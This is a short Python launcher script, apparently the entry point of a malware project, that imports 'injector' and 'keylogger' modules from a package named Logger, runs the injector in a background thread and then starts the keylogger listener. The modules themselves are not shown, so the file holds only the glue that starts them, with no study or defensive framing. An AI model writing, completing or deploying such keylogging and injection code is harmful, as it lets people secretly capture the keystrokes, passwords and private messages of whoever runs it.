from Logger import injector, keylogger 
import threading 

def start():
    injector_thread = threading.Thread(target=injector.start)  # Create a thread for the injector module's
    injector_thread.start()  # Start the injector
    keylogger.start()  # Start the Keylogger listener

if __name__ == '__main__':
    start()